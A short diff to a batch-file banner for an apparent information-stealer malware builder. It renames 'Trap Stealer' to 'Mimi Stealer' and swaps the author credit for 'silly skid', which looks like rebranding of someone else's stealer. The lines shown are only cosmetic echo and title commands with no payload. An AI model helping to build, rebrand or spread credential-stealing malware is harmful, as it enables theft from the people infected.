@@ -1,6 +1,6 @@
 @echo off
 
-title Trap Stealer
+title Mimi Stealer
 rem You can do any color
 color 0c
 
@@ -23,7 +23,7 @@ echo "\$$$$$$  |  \$$$$  |\$$$$$$$\ \$$$$$$$ |$$ |\$$$$$$$\ $$ |      ";
 echo " \______/    \____/  \_______| \_______|\__| \_______|\__|      ";
 echo.
 echo.
-echo Coded By https://github.com/TheCuteOwl/
+echo silly skid
 echo.
 echo Press any key to continue with the builder.
 set /p trap=
